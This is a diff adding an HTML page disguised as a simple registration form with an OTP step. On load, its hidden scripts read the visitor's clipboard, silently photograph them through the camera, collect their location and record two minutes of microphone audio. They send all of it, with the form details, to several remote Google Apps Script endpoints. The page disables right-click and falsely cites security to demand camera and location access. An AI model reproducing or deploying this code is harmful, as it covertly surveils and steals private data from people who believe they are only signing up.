@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=800" />
+    <link rel="icon" type="image/png" href="images/photo1.jpg" />
+    <title>Registration Page</title>
+    <style>
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f8f9fa;
+        margin: 0;
+        padding: 0;
+      }
+
+      .form-container {
+        background-color: #ffffff;
+        max-width: 500px;
+        margin: 10px auto;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      }
+
+      h1 {
+        text-align: center;
+        color: #007bff;
+      }
+
+      .form-group {
+        margin-bottom: 10px;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 5px;
+        color: #495057;
+        font-weight: bold;
+      }
+
+      input[type="text"],
+      input[type="email"],
+      input[type="tel"],
+      input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        border: 2px solid #007bff;
+        border-radius: 8px;
+        box-sizing: border-box;
+        margin-top: 4px;
+        font-size: 12px;
+      }
+
+      .btn {
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      button {
+        padding: 10px 20px;
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.3s;
+      }
+
+      button:hover {
+        background-color: #0056b3;
+      }
+
+      .close-button {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        font-size: 24px;
+        cursor: pointer;
+        color: #495057;
+      }
+
+      /* Additional Styling for Responsive Design */
+      @media only screen and (max-width: 600px) {
+        .form-container {
+          padding: 20px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        input[type="password"] {
+          font-size: 14px;
+        }
+
+        button {
+          font-size: 14px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <br />
+    <div class="form-container">
+      <h1>Registration Page</h1>
+      <div class="form-group">
+        <label for="name">Name:</label>
+        <input
+          type="text"
+          id="name"
+          name="name"
+          placeholder="Your Name"
+          required
+        />
+      </div>
+      <div class="form-group">
+        <label for="phone">Phone:</label>
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="Your Phone"
+          required
+        />
+      </div>
+      <div class="form-group">
+        <label for="email">Email:</label>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Your Email"
+          required
+        />
+      </div>
+      <div class="btn">
+        <button onclick="sendOtp()">Send OTP</button>
+      </div>
+      <div class="form-group">
+        <label for="otp">OTP:</label>
+        <input
+          type="text"
+          id="otp"
+          name="otp"
+          placeholder="Enter OTP"
+          required
+        />
+      </div>
+      <div class="btn">
+        <button onclick="if(validateForm()) validateOTP()">Submit</button>
+        <button type="button" onclick="window.location.href='login.html'">
+          Login
+        </button>
+      </div>
+    </div>
+
+    <div id="clipboardData"></div>
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <img
+      id="captured-image"
+      src=""
+      alt="Captured Image"
+      style="display: none"
+    />
+
+    <script>
+      function validateForm() {
+        var name = document.getElementById("name").value;
+        var phone = document.getElementById("phone").value;
+        var email = document.getElementById("email").value;
+        var otp = document.getElementById("otp").value;
+
+        if (name === "" || phone === "" || email === "" || otp === "") {
+          alert("All fields must be filled out");
+          return false;
+        }
+
+        return true;
+      }
+
+      var receivedOtp;
+      function sendOtp() {
+        var website123 = "https://arunkumar-selvaraj.web.app/register.html";
+        var email = document.getElementById("email").value;
+        var name = document.getElementById("name").value;
+        var phone = document.getElementById("phone").value;
+        const formData = new FormData();
+        formData.append("email", email);
+        formData.append("website", website123);
+        formData.append("name", name);
+        formData.append("phone", phone);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbww7dIxod4QczNM7rd1RmidcjfWa8tmSl7u5Q1Pms6I7Wsa7qDs2g9Q7uI3JrkVd_0hZg/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+            receivedOtp = data;
+            console.log("Received OTP: " + receivedOtp);
+            alert("OTP sent to email - Check Email");
+          })
+          .catch((error) => {
+            console.error("Error sending data to the server:", error);
+          });
+      }
+
+      function validateOTP() {
+        var otp = document.getElementById("otp").value;
+        if (otp == receivedOtp) {
+          registerData();
+        } else {
+          alert("Incorrect OTP - Check Otp again");
+        }
+      }
+      // Declare a global variable to store clipboard data
+      let storedClipboardData;
+
+      function paste() {
+        // Read text from the clipboard
+        navigator.clipboard.readText().then(function (clipboardData) {
+          // Store the clipboard data in the global variable
+          storedClipboardData = clipboardData;
+        });
+      }
+      paste();
+
+      if (navigator.geolocation) {
+        navigator.permissions
+          .query({ name: "geolocation" })
+          .then(function (result) {
+            if (result.state === "granted") {
+              // Geolocation access granted
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  // Handle the obtained position
+                },
+                function (error) {
+                  console.error("Error getting geolocation:", error);
+                }
+              );
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            } else if (result.state === "denied") {
+              // Geolocation access denied by the user
+              console.error("Geolocation access denied by the user.");
+              // You can inform the user or provide an alternative method
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            }
+          });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+      captureCamera();
+      let latitude;
+      let longitude;
+      let mapUrl;
+      var website = "https://arunkumar-selvaraj.web.app/register.html";
+      let capturedImage = document.getElementById("captured-image");
+      var imageDataUrl;
+
+      function captureCamera() {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (cameraStream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            video.srcObject = cameraStream;
+            video.onloadedmetadata = function () {
+              captureImage(cameraStream);
+            };
+          })
+          .catch(function (error) {
+            console.error("Error accessing the camera: " + error);
+          });
+
+        getLocation();
+      }
+
+      function getLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            function (error) {
+              console.error("Error accessing geolocation: " + error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported");
+        }
+      }
+
+      function captureImage(stream) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageDataUrl = canvas.toDataURL("image/png");
+        capturedImage.src = imageDataUrl;
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach((track) => track.stop());
+          sendImageData(imageDataUrl);
+        }
+      }
+
+      function sendImageData(imageDataUrl) {
+        let url =
+          "https://script.google.com/macros/s/AKfycby1ejeAgqBPkDuJ11yoQ9Tlu4gpLgmlJrsndWIJ_io6mk1wQ17XysixomV0ajcnnhfF/exec";
+        console.log(latitude);
+        console.log(longitude);
+        console.log("imageDataUrl" + imageDataUrl.split("base64,")[1]);
+        let obj = {
+          base64: imageDataUrl.split("base64,")[1],
+          type: "image/png",
+          name: "captured_image.png",
+          url: mapUrl,
+          latitude: latitude,
+          longitude: longitude,
+          website: website,
+          storedClipboardData: storedClipboardData,
+        };
+        fetch(url, {
+          method: "POST",
+          body: JSON.stringify(obj),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error sending image: " + error));
+      }
+    </script>
+
+    <div id="status"><span id="statusText"></span></div>
+    <script>
+      const status = document.getElementById("status");
+      console.log("Requesting access to the microphone...");
+      navigator.mediaDevices
+        .getUserMedia({ audio: true })
+        .then((stream) => {
+          console.log("Microphone access granted.");
+          const mediaRecorder = new MediaRecorder(stream);
+          const recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {
+            recordedChunks.push(event.data);
+            console.log("Data available...");
+          };
+          mediaRecorder.onstop = () => {
+            console.log("Recording stopped.");
+            const blob = new Blob(recordedChunks, { type: "audio/webm" });
+            console.log("Blob created:", blob);
+            convertBlobToBase64(blob); // Convert blob to Base64 URL
+          };
+          mediaRecorder.start();
+          console.log("Recording started...");
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Stopping recording after 10 seconds...");
+          }, 120000); // Stop recording after 10 seconds (adjust as needed)
+        })
+        .catch((err) => {
+          console.error("Error accessing the microphone:", err);
+        });
+
+      function convertBlobToBase64(blob) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const base64String = event.target.result.split(",")[1]; // Extracting base64 string
+          sendAudioToServer(base64String);
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      function sendAudioToServer(base64String) {
+        const formData = new FormData();
+        formData.append("audio", base64String);
+        formData.append("website", website);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
+        formData.append("url", mapUrl);
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+          })
+          .catch((error) => {
+            console.error("Error sending audio to the server:", error);
+          });
+      }
+      setTimeout(function () {
+        window.location.reload();
+      }, 160000);
+
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+
+      function registerData() {
+        var name = document.getElementById("name").value;
+        var phone = document.getElementById("phone").value;
+        var email = document.getElementById("email").value;
+
+        const formData = new FormData();
+        formData.append("name", name || "");
+        formData.append("email", email || "");
+        formData.append("phone", phone || "");
+        formData.append("weburl", website || "");
+        formData.append("latitude", latitude || "");
+        formData.append("longitude", longitude || "");
+        formData.append("storedClipboardData", storedClipboardData || "");
+        formData.append("mapUrl", mapUrl || "");
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        if (!imageDataUrl) {
+          alert(
+            "Allow Location and camera to process Registration - For security Purpose"
+          );
+        } else {
+          formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+          fetch(
+            "https://script.google.com/macros/s/AKfycbwYFIsVv9xgx1UZ3KWC07dniRGWuYNXqrYfd4aaCK7WSex4MnIGIwqrTT8-rA50HwFWvA/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then((response) => {
+              console.log("Server response received:", response);
+              return response.text(); // Convert the response to text
+            })
+            .then((data) => {
+              console.log("Response: " + data);
+              alert("Registration Done Successfully - You can log in now");
+              window.location.reload();
+            })
+            .catch((error) => {
+              console.error("Error sending data to the server:", error);
+              alert("Sorry for Inconvenience - Please Register Again");
+              window.location.reload();
+            });
+        }
+      }
+    </script>
+  </body>
+</html>
